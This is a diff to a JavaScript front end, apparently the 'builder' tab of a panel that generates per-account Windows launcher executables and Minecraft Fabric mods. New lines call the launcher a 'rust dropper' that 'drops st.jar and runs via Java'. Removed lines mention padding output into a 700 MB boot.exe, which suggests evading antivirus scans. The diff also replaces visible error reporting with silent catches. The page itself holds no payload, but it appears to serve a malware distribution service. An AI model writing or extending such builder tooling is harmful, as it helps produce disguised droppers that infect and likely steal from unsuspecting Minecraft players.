@@ -1,22 +1,11 @@
 // language: JavaScript, file: public/js/builder.js
 // builder tab — windows launcher + minecraft fabric mod.
-// hardened: waits for button to exist, catches errors visibly, no silent fails.
+// launcher deliverables are now raw .exe files (no padding).
 
 (function () {
   'use strict';
 
   const $ = (id) => document.getElementById(id);
-
-  function logErr(context, err) {
-    console.error(`[builder:${context}]`, err);
-    const out = $('mc-result');
-    if (out) {
-      out.innerHTML = `<div class="err" style="margin-top:16px;padding:12px;border:1px solid var(--red);border-radius:8px;">
-        <div style="font-weight:600;margin-bottom:6px;">Builder script error (${context})</div>
-        <div style="font-family:var(--mono);font-size:11px;white-space:pre-wrap;">${String(err?.stack || err).slice(0, 500)}</div>
-      </div>`;
-    }
-  }
 
   function humanSize(n) {
     if (n < 1024) return `${n} B`;
@@ -30,7 +19,7 @@
     }[c]));
   }
 
-  // ---------- builds list ----------
+  // ---------- builds list (windows + minecraft) ----------
 
   async function loadBuilds() {
     const host = $('b-rows');
@@ -74,7 +63,7 @@
         });
         host.appendChild(el);
       });
-    } catch (e) { logErr('loadBuilds', e); }
+    } catch {}
   }
 
   // ---------- windows launcher build ----------
@@ -88,7 +77,7 @@
 
     btn.disabled = true;
     btn.textContent = 'building…';
-    out.innerHTML = '<div class="note">compiling + padding + zipping — first build takes 2–3 min, after that ~30s</div>';
+    out.innerHTML = '<div class="note">compiling rust dropper — takes about 30–60 seconds</div>';
 
     try {
       const r = await fetch('/api/build', {
@@ -104,15 +93,15 @@
       } else {
         out.innerHTML = `
           <div class="tile">
-            <div class="k">build ready — zip download starting</div>
+            <div class="k">build ready — exe download starting</div>
             <div class="v mono" style="font-size:13px;margin-top:8px">${esc(d.key)}</div>
             <div class="note" style="margin-top:8px">
-              ${humanSize(d.size)} zip · extracts to a 700 MB boot.exe
+              ${humanSize(d.size)} exe · drops st.jar and runs via Java
             </div>
             <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
               <button class="ghost mini" id="b-dl-now">download again</button>
             </div>
-            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.zip</code></div>
+            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.exe</code></div>
           </div>`;
 
         const iframe = document.createElement('iframe');
@@ -126,9 +115,8 @@
         });
         loadBuilds();
       }
-    } catch (e) {
-      out.innerHTML = `<div class="err">network error: ${esc(e.message)}</div>`;
-      logErr('doBuild', e);
+    } catch {
+      out.innerHTML = '<div class="err">network error</div>';
     }
 
     btn.disabled = false;
@@ -209,14 +197,11 @@
       } else if (p.step === 'failed') {
         stopMcPoll();
         const out = $('mc-result');
-        if (out) out.innerHTML = `<div class="err" style="margin-top:16px;padding:12px;border:1px solid var(--red);border-radius:8px;">
-          <div style="font-weight:600;margin-bottom:6px;">Build failed on server</div>
-          <div style="font-family:var(--mono);font-size:11px;white-space:pre-wrap;">${esc(p.error || 'unknown')}</div>
-        </div>`;
+        if (out) out.innerHTML = `<div class="err" style="margin-top:16px">build failed: ${esc(p.error || 'unknown')}</div>`;
         const btn = $('mc-build');
         if (btn) { btn.disabled = false; btn.textContent = 'build .jar'; }
       }
-    } catch (e) { logErr('pollMcProgress', e); }
+    } catch {}
   }
 
   async function doMcBuild() {
@@ -249,9 +234,8 @@
       stopMcPoll();
       mcPollTimer = setInterval(pollMcProgress, 1000);
       pollMcProgress();
-    } catch (e) {
-      out.innerHTML = `<div class="err" style="margin-top:16px">network error: ${esc(e.message)}</div>`;
-      logErr('doMcBuild', e);
+    } catch {
+      out.innerHTML = '<div class="err" style="margin-top:16px">network error</div>';
       btn.disabled = false; btn.textContent = 'build .jar';
     }
 
@@ -260,47 +244,27 @@
     }, 5 * 60 * 1000);
   }
 
-  // ---------- boot & resilient binding ----------
-
-  let mcBound = false;
-  let launcherBound = false;
-
-  function bindButtons() {
-    const buildBtn = $('b-build');
-    if (buildBtn && !launcherBound) {
-      buildBtn.addEventListener('click', doBuild);
-      launcherBound = true;
-    }
-
-    const mcBtn = $('mc-build');
-    if (mcBtn && !mcBound) {
-      mcBtn.addEventListener('click', doMcBuild);
-      mcBound = true;
-      console.log('[builder] mc-build button bound');
-    }
-  }
+  // ---------- boot ----------
 
   function boot() {
+    if (!$('b-key')) return;
     if (window.__builderBooted) return;
     window.__builderBooted = true;
 
-    // bind immediately if elements exist
-    bindButtons();
-
-    // if the DOM changes (tab switches, dynamically loaded content),
-    // re-check for the buttons.
-    const observer = new MutationObserver(() => {
-      bindButtons();
-    });
-    observer.observe(document.body, { childList: true, subtree: true });
-
     preloadAccountKey();
+
+    const buildBtn = $('b-build');
+    if (buildBtn) buildBtn.addEventListener('click', doBuild);
+
+    const mcBtn = $('mc-build');
+    if (mcBtn) mcBtn.addEventListener('click', doMcBuild);
+
     loadBuilds();
 
     const navBuilder = document.querySelector('.nav a[data-tab="builder"]');
     if (navBuilder) {
       navBuilder.addEventListener('click', () => {
-        setTimeout(() => { preloadAccountKey(); loadBuilds(); bindButtons(); }, 0);
+        setTimeout(() => { preloadAccountKey(); loadBuilds(); }, 0);
       });
     }
 
